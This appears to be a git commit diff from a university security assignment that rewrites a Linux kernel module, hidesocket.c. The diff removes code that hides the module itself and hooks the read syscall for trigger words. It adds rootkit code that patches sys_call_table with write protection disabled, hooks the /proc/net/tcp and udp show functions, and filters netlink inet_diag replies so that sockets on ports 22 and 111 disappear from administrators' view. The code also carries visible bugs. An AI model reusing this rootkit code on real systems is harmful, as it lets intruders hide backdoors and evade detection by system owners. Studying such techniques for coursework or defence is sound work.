d595eb32e79b81cebb02f2746d48e63fd28dfaaa
Guru Mc <ga79rok@mytum.de>
2014-11-22 12:32:47 +0100

    gmc: working tcp versiongit add hidesocket.c

--- assignment06/hidesocket.c
+++ assignment06/hidesocket.c
@@ -6,180 +6,152 @@
 #include <linux/fs.h>
 #include <linux/sched.h>
 #include <asm/page.h>
-#include <linux/kernfs.h>
-#include <linux/rbtree.h>
-#include <linux/hash.h>
-#include <linux/cred.h>
+#include <linux/unistd.h>
 #include <linux/sysfs.h>
 #include <linux/delay.h>
 
-#include "sysmap.h"
-#define member rb
+#include <net/tcp.h>
+#include <net/udp.h>
+#include <linux/inet_diag.h>
+#include <linux/socket.h>
+//#include "fs/proc/internal.h" 
 
-static struct list_head *module_previous;
-static int  hidden = 0;
-static int state = 0;
-static int hstate = 0;
+#include "sysmap.h"
 
 static int call_counter = 0;
 
 void **sys_call_table;
+/* since this sturct is no longer available in proc_fs, taken from fs/proc/internal.h */
+struct proc_dir_entry {
+          unsigned int low_ino;
+          umode_t mode;
+          nlink_t nlink;
+          kuid_t uid;
+          kgid_t gid;
+          loff_t size;
+          const struct inode_operations *proc_iops;
+          const struct file_operations *proc_fops;
+          struct proc_dir_entry *next, *parent, *subdir;
+          void *data;
+          atomic_t count;         /* use count */
+          atomic_t in_use;        /* number of callers into module in progress; */
+                          /* negative -> it's going away RSN */
+          struct completion *pde_unload_completion;
+          struct list_head pde_openers;   /* who did ->open, but not ->release */
+          spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+          u8 namelen;
+          char name[];
+  };
 
-asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);
 
-static void kernfs_remove_node(struct kernfs_node *kn)
+asmlinkage int (*original_tcp_show) (struct seq_file *m, void *v);
+asmlinkage int (*original_udp_show) (struct seq_file *m, void *v);
+asmlinkage long (*original_socketcall) (int call, unsigned long *args);
+
+/* Access the port number and if it should be hidden then return 0 else return the original function */
+static int manipulated_tcp_show(struct seq_file* m, void *v)
 {
-	/* rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree 
-	 * Line 272@Linux/fs/kernfs/dir.c  
-	 */	
-	rb_erase(&kn->rb, &kn->parent->dir.children);
-	RB_CLEAR_NODE(&kn->rb);
-}
+	int port;
+	struct sock *sk;
+	struct inet_sock *inet;
 
-void delete_from_kernfs_tree(void){
-    kernfs_remove_node(THIS_MODULE->mkobj.kobj.sd);
-}
-
-/* Function to hide the module */
-void module_hide(void)
-{
-	if (hidden) return;
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	delete_from_kernfs_tree();	
-	hidden = !hidden;
-}
-
-int name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kn)
-{
-	if(hash != kn->hash)
-		return hash - kn->hash;
-	if(ns != kn->ns)
-		return ns - kn->ns;
-	return strcmp(name,kn->name);
-
-}
-
-int kernfs_insert_node(struct kernfs_node *kn)
-{
-      struct rb_node **node = &kn->parent->dir.children.rb_node;
-      struct rb_node *parent = NULL; 
+	if(SEQ_START_TOKEN == v)
+		return original_tcp_show(m,v);
+	sk = (struct sock *) v;
+	inet = inet_sk(sk);
+	port = ntohs(inet->inet_sport);
 	
-      //printk("yaay! inside insert \n");
+	/* Hard coded to the port we know: todo: Change it according to user input*/
+	if(port == 22)
+		return 0;
 
-      while(*node)
-      {
-		struct kernfs_node *pos;
-		int result;
-		/* Get the kernfs_node from rb, rb_to_kn() */
-		pos = rb_entry(*node, struct kernfs_node, member); 
-		parent = *node;
-		/*compare the names to get the position to insert in rb tree*/
-		result = name_compare(kn->hash, kn->name, kn->ns, pos);
-		//result = kernfs_sd_comapre(kn,pos);
+	return original_tcp_show(m,v);
+}
 
-		if(result < 0)
-			node = &pos->rb.rb_left;
-		else if(result > 0)
-			node = &pos->rb.rb_right;
-		else 
-		{
-			return -EEXIST;
-		}
-	}
+/* Access the port number for udp and if it should be hidden then return 0 else return the original function */
+static int manipulated_udp_show(struct seq_file* m, void *v)
+{
+        int port;
+        struct sock *sk;
+        struct inet_sock *inet;
+
+        if(SEQ_START_TOKEN == v)
+                return original_tcp_show(m,v);
+        sk = (struct sock *) v;
+        inet = inet_sk(sk);
+        port = ntohs(inet->inet_sport);
+        
+        /* Hard coded to the port we know: todo: Change it according to user input @gmc*/
+        if(port == 111)
+                return 0;
+
+        return original_udp_show(m,v);
+}
+
+/* Check if we need to hide this socket */
+static int checkport(struct nlmsghdr *nlh)
+{
+	struct inet_diag_msg *r = NLMSG_DATA(nlh);
+    	int lport = ntohs(r->id.idiag_sport);
 	
-	/* Add new node and reblance the tree*/
-	rb_link_node(&kn->rb,parent,node);
-	rb_insert_color(&kn->rb, &kn->parent->dir.children);
-	
-	/* Successfully added, account subdir number */
-	if (kernfs_type(kn) == KERNFS_DIR)
-                 kn->parent->dir.subdirs++;
+	if(lport == 22) //@gmc: change
+		return 1;
 	return 0;
 }
 
-void add_to_kernfs_tree(void){
-    kernfs_insert_node(THIS_MODULE->mkobj.kobj.sd);
-}
+/* hooked socketcall */
+asmlinkage long manipulated_socketcall(int call, unsigned long __user *args)
+{	
+	long retval;
+    	long status; // bytes remaining until end of result
+    struct msghdr* msg;
+    struct nlmsghdr* h;
+    __kernel_size_t numblocks;
+    struct inet_diag_msg *r;
+    char* currhdr;
+    int i;
+    int found=0;
+    int offset;
 
- 
-void module_show(void)
-{
-	printk("Unhiding module  %s\n",THIS_MODULE->name);
-	if (!hidden) return;
-	list_add(&THIS_MODULE->list, module_previous);
-	add_to_kernfs_tree();	
-	hidden = !hidden;
-}
-
-
-/* State machine to match words "show" and "ping"*/
-static void match_word(char c)
-{
-	switch(c)
-        {
-          case 's':if(!hstate) hstate++;
-                   break;
-
-          case 'h':if(hstate == 1) hstate++;
-                   break;
-
-          case 'o':if(hstate == 2) hstate++;
-                   break;
-
-          case 'w':if(hstate == 3) {hstate = 0; module_show();}
-                    break;
-
-	  case 'p':if(!state) state++;
-                   break;
-
-          case 'i':if(state == 1) state++;
-                   break;
-
-          case 'n':if(state == 2) state++; 
-                   break;
-
-          case 'g':if(state == 3) {printk(KERN_INFO"pong\n"); state = 0;}
-                    break;
-
-          default: state = 0; hstate = 0; break;
-        }
-	return;
-}
-
-void scan_input(long count, char *buf)
-{
-        int i = 0;
-        for(i = 0; i<count ; i++)
-        {
-		//match_ping(buf[i]);
-		match_word(buf[i]);	
-	}
-}
-
-/*
- * Our manipulated read syscall. It will print every keystroke to the syslog
- * and call the original read afterwards.
- */
-asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
-{
-        call_counter++;
+		
+	if(call == SYS_RECVMSG)
+	{
+	msg = (struct msghdr*)(((int*)args)[1]);
+        h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
+        numblocks = msg->msg_iovlen;
+        r = NLMSG_DATA(h);
+        // compute "real" result with orig_socketcall
+        retval = original_socketcall(call, args);
+        // status holds the bytes remaining
+        status = retval;
+        // now, we remove the sockets to be hidden from the result...
+        found = 1;
 	
-	long ret;
-        ret = original_read(fd,buf,count);
-
-        //read from stdin and print it using printk
-        if(ret >= 1 && fd == 0)
-        {
-		/* scan the input for the specific commands entered */
-		scan_input(ret,buf);
+	while (NLMSG_OK(h, status)) {
+            if (found == 0){
+                h = NLMSG_NEXT(h, status);
+            }
+            currhdr = (char*)h;
+            if (checkport(h))
+	    {
+                found = 1;
+                offset = NLMSG_ALIGN((h)->nlmsg_len);
+                for (i=0; i<status; ++i){
+                    // "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
+                    currhdr[i] = currhdr[i + offset];
+                }
+                retval = retval - offset;
+            }
+            else {
+                found = 0;
+            }
         }
+	return retval;
+	}	
 
-	call_counter--;
-        return ret;
 	
+return original_socketcall(call, args);
 }
-
 /*
  * Disable the writing protection for the whole processor.
  */
@@ -211,43 +183,91 @@ static void enable_page_protection (void)
 
 static int __init hidemodule_init(void)
 {
-	printk(KERN_INFO "Loading hide_module LKM...\n");
+	printk(KERN_INFO "Loading socket_hider LKM...\n");
 
         /* get the location of the sys_call_table from our sysmap.h file */
         sys_call_table = (void*) sysmap_sys_call_table;
+
+	struct proc_dir_entry *proc = init_net.proc_net->subdir;
+    	struct tcp_seq_afinfo *tcp_seq = 0;
+    	struct udp_seq_afinfo *udp_seq = 0;
+	int count = 0;
+	
+	while(proc && count<1)
+	{	
+		if(strcmp(proc->name, "tcp") == 0)
+		{	
+			tcp_seq = proc->data;
+			original_tcp_show = tcp_seq->seq_ops.show;
+			tcp_seq->seq_ops.show = manipulated_tcp_show;
+			count++;
+		}
+	//todo : hiding for udp: insmod crashing
+	/*	if(strcmp(proc->name, "udp") == 0)
+		{
+			udp_seq = proc->data;
+			original_udp_show = udp_seq->seq_ops.show;
+			tcp_seq->seq_ops.show = manipulated_udp_show;
+			count++;
+		} */
+		//todo: write for udp also: done
+		proc = proc->next;
+	}
 
         /* disable the write-protection */
         disable_page_protection();
 
         /*
-         * keep pointer to original function in original_read, and
+         * keep pointer to original function in original_socketcall, and
          * replace the system call in the system call table with
-         * manipulated_read
+         * manipulated_socketcall
          */
-        original_read = (void *)sys_call_table[__NR_read];
-        sys_call_table[__NR_read] = (unsigned long*)manipulated_read;
+        original_socketcall = (void *)sys_call_table[__NR_socket];
+        sys_call_table[__NR_socket] = (unsigned long*)manipulated_socketcall;
 
         /* reenable the write-protection */
         enable_page_protection();
 
-	module_hide();
-	
 	return 0;
 }
 
 static void __exit hidemodule_exit(void)
 {
-	printk(KERN_INFO "Unloading hidden module... bye!\n");
-
+	printk(KERN_INFO "Unloading sockethider module... bye!\n");
+	
 	while(call_counter > 0)
 	{
 		msleep(2);
 	}
-        /* disable the write-protection */
+        struct proc_dir_entry *proc = init_net.proc_net->subdir;
+	struct tcp_seq_afinfo *tcp_seq = 0;
+    	struct udp_seq_afinfo *udp_seq = 0;
+	int count = 0;
+	
+	while(proc && count<1)
+	{
+		if (strcmp(proc->name, "tcp") == 0)
+		{
+            		tcp_seq = proc->data;
+	                tcp_seq->seq_ops.show = original_tcp_show;
+            		count++;
+        	}
+		/*if(strcmp(proc->name, "udp") == 0)
+		{
+			udp_seq = proc->data;
+			udp_seq->seq_ops.show = original_udp_show;
+			count++;
+		}*/
+	
+		proc = proc->next;
+	}
+
+	
+	/* disable the write-protection */
         disable_page_protection();
 
         /* Return the system call back to original */
-        sys_call_table[__NR_read] = (unsigned long *)original_read;
+        sys_call_table[__NR_socket] = (unsigned long *)original_socketcall;
 
         /* reenable the write-protection */
         enable_page_protection();
